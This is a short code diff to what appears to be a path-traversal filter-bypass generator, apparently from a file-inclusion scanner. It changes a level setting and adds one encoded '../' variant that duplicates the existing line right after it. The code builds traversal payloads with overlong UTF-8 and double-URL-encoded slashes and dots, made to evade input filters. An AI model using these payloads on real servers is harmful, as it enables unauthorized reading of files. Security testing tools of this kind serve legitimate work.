@@ -1,4 +1,4 @@
-LEVEL = 3
+LEVEL = 1
 CACHE_FILTER = None
 MAX_DEPTH = 10
 
@@ -34,7 +34,7 @@ def calc_filters():
         res.append(FilterByPass(prefix="file://", suffix=suffix))
 
         # climb up directory tree
-        for level in [0, MAX_DEPTH]:  # maximum depth
+        for level in [0, MAX_DEPTH]:
 
             res.append(FilterByPass(prefix="../" * level, suffix=suffix))
 
@@ -54,6 +54,8 @@ def calc_filters():
                 res.append(FilterByPass(replacers={"/": "%c0%af"}, prefix="../" * level, suffix=suffix))
                 res.append(
                     FilterByPass(replacers={"/": "%252f", ".": "%252e"}, prefix="../" * level, suffix=suffix))
+                res.append(
+                    FilterByPass(replacers={"/": "%c0%af", ".": "%252e"}, prefix="../" * level, suffix=suffix))
                 res.append(
                     FilterByPass(replacers={"/": "%c0%af", ".": "%252e"}, prefix="../" * level, suffix=suffix))
 
